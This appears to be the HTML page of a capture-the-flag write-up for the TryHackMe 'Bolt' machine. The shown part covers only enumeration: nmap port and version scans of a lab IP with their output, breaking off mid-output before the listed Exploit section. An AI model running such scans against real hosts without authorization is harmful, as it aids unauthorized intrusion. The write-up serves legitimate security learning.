@@ -1,0 +1,1261 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../blueprint/">
+      
+      
+        <link rel="next" href="../../tags/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Bolt - rdrg0x</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#bolt" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="rdrg0x" class="md-header__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            rdrg0x
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Bolt
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="rdrg0x" class="md-nav__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    rdrg0x
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackme
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackme
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../alfred/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Alfred
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ADBasicEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Basic Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../anthem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../atlas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atlas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attackingkerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attacktivedirectory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacktive Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../basicpentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basic Pentesting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blaster/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blaster
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blueprint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blueprint
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bolt
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bolt
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../HackTheBox/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Writeups
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../alfred/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    TryHackme
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="bolt">Bolt<a class="headerlink" href="#bolt" title="Permanent link">&para;</a></h1>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-vvv<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.103.171<span class="w"> </span>-oG<span class="w"> </span>allPorts
+</code></pre></div>
+<p><img alt="alt text" src="img/image.png" /></p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-O<span class="w"> </span>-p22,80,8000<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.103.171<span class="w"> </span>-oN<span class="w"> </span>targeted.txt
+
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.3<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span>f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="m">77</span>:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="m">07</span>:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.29<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Apache2<span class="w"> </span>Ubuntu<span class="w"> </span>Default<span class="w"> </span>Page:<span class="w"> </span>It<span class="w"> </span>works
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="m">8000</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span><span class="o">(</span>PHP<span class="w"> </span><span class="m">7</span>.2.32-1<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Bolt<span class="w"> </span><span class="p">|</span><span class="w"> </span>A<span class="w"> </span>hero<span class="w"> </span>is<span class="w"> </span>unleashed
+<span class="p">|</span>_http-generator:<span class="w"> </span>Bolt
+<span class="p">|</span><span class="w"> </span>fingerprint-strings:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>FourOhFourRequest:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span>HTTP/1.0<span class="w"> </span><span class="m">404</span><span class="w"> </span>Not<span class="w"> </span>Found
+<span class="p">|</span><span class="w">     </span>Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">27</span><span class="w"> </span>Sep<span class="w"> </span><span class="m">2024</span><span class="w"> </span><span class="m">08</span>:27:38<span class="w"> </span>GMT
+<span class="p">|</span><span class="w">     </span>Connection:<span class="w"> </span>close
+<span class="p">|</span><span class="w">     </span>X-Powered-By:<span class="w"> </span>PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
+<span class="p">|</span><span class="w">     </span>Cache-Control:<span class="w"> </span>private,<span class="w"> </span>must-revalidate
+<span class="p">|</span><span class="w">     </span>Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">27</span><span class="w"> </span>Sep<span class="w"> </span><span class="m">2024</span><span class="w"> </span><span class="m">08</span>:27:38<span class="w"> </span>GMT
+<span class="p">|</span><span class="w">     </span>Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
+<span class="p">|</span><span class="w">     </span>pragma:<span class="w"> </span>no-cache
+<span class="p">|</span><span class="w">     </span>expires:<span class="w"> </span>-1
+<span class="p">|</span><span class="w">     </span>X-Debug-Token:<span class="w"> </span>c3f952
+<span class="p">|</span><span class="w">     </span>&lt;!doctype<span class="w"> </span>html&gt;
+<span class="p">|</span><span class="w">     </span>&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;head&gt;
+<span class="p">|</span><span class="w">     </span>&lt;meta<span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;meta<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;viewport&quot;</span><span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;title&gt;Bolt<span class="w"> </span><span class="p">|</span><span class="w"> </span>A<span class="w"> </span>hero<span class="w"> </span>is<span class="w"> </span>unleashed&lt;/title&gt;
+<span class="p">|</span><span class="w">     </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;link<span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/theme/base-2018/css/bulma.css?8ca0842ebb&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;link<span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/theme/base-2018/css/theme.css?6cb66bfe9f&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;meta<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;generator&quot;</span><span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Bolt&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;/head&gt;
+<span class="p">|</span><span class="w">     </span>&lt;body&gt;
+<span class="p">|</span><span class="w">     </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#main-content&quot;</span><span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;vis</span>
+<span class="s2">|   GetRequest: </span>
+<span class="s2">|     HTTP/1.0 200 OK</span>
+<span class="s2">|     Date: Fri, 27 Sep 2024 08:27:38 GMT</span>
+<span class="s2">|     Connection: close</span>
+<span class="s2">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1</span>
+<span class="s2">|     Cache-Control: public, s-maxage=600</span>
+<span class="s2">|     Date: Fri, 27 Sep 2024 08:27:38 GMT</span>
+<span class="s2">|     Content-Type: text/html; charset=UTF-8</span>
+<span class="s2">|     X-Debug-Token: 1342be</span>
+<span class="s2">|     &lt;!doctype html&gt;</span>
+<span class="s2">|     &lt;html lang=&quot;</span>en-GB<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;head&gt;</span>
+<span class="s2">|     &lt;meta charset=&quot;</span>utf-8<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;meta name=&quot;</span>viewport<span class="s2">&quot; content=&quot;</span><span class="nv">width</span><span class="o">=</span>device-width,<span class="w"> </span>initial-scale<span class="o">=</span><span class="m">1</span>.0<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;</span>
+<span class="s2">|     &lt;link href=&quot;</span>https://fonts.googleapis.com/css?family<span class="o">=</span>Bitter<span class="p">|</span>Roboto:400,400i,700<span class="s2">&quot; rel=&quot;</span>stylesheet<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;link rel=&quot;</span>stylesheet<span class="s2">&quot; href=&quot;</span>/theme/base-2018/css/bulma.css?8ca0842ebb<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;link rel=&quot;</span>stylesheet<span class="s2">&quot; href=&quot;</span>/theme/base-2018/css/theme.css?6cb66bfe9f<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;meta name=&quot;</span>generator<span class="s2">&quot; content=&quot;</span>Bolt<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;link rel=&quot;</span>canonical<span class="s2">&quot; href=&quot;</span>http://0.0.0.0:8000/<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;/head&gt;</span>
+<span class="s2">|_    &lt;body class=&quot;</span>front<span class="s2">&quot;&gt;</span>
+<span class="s2">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="s2">SF-Port8000-TCP:V=7.94SVN%I=7%D=9/27%Time=66F66C7A%P=x86_64-pc-linux-gnu%r</span>
+<span class="s2">SF:(GetRequest,19F9,&quot;</span>HTTP/1<span class="se">\.</span><span class="m">0</span><span class="se">\x</span><span class="m">20200</span><span class="se">\x</span>20OK<span class="se">\r\n</span>Date:<span class="se">\x</span>20Fri,<span class="se">\x</span><span class="m">2027</span><span class="se">\x</span>20Sep<span class="se">\</span>
+SF:x202024<span class="se">\x</span><span class="m">2008</span>:27:38<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n</span>X-Powered-By:<span class="se">\x</span><span class="m">20</span>
+SF:PHP/7<span class="se">\.</span><span class="m">2</span><span class="se">\.</span><span class="m">32</span>-1<span class="se">\+</span>ubuntu18<span class="se">\.</span><span class="m">04</span><span class="se">\.</span><span class="m">1</span><span class="se">\+</span>deb<span class="se">\.</span>sury<span class="se">\.</span>org<span class="se">\+</span><span class="m">1</span><span class="se">\r\n</span>Cache-Control:<span class="se">\x</span><span class="m">2</span>
+SF:0public,<span class="se">\x</span>20s-maxage<span class="o">=</span><span class="m">600</span><span class="se">\r\n</span>Date:<span class="se">\x</span>20Fri,<span class="se">\x</span><span class="m">2027</span><span class="se">\x</span>20Sep<span class="se">\x</span><span class="m">202024</span><span class="se">\x</span><span class="m">2008</span>:27
+SF::38<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/html<span class="p">;</span><span class="se">\x</span>20charset<span class="o">=</span>UTF-8<span class="se">\r\n</span>X-Debug-T
+SF:oken:<span class="se">\x</span>201342be<span class="se">\r\n\r\n</span>&lt;!doctype<span class="se">\x</span>20html&gt;<span class="se">\n</span>&lt;html<span class="se">\x</span>20lang<span class="o">=</span><span class="se">\&quot;</span>en-GB<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span>
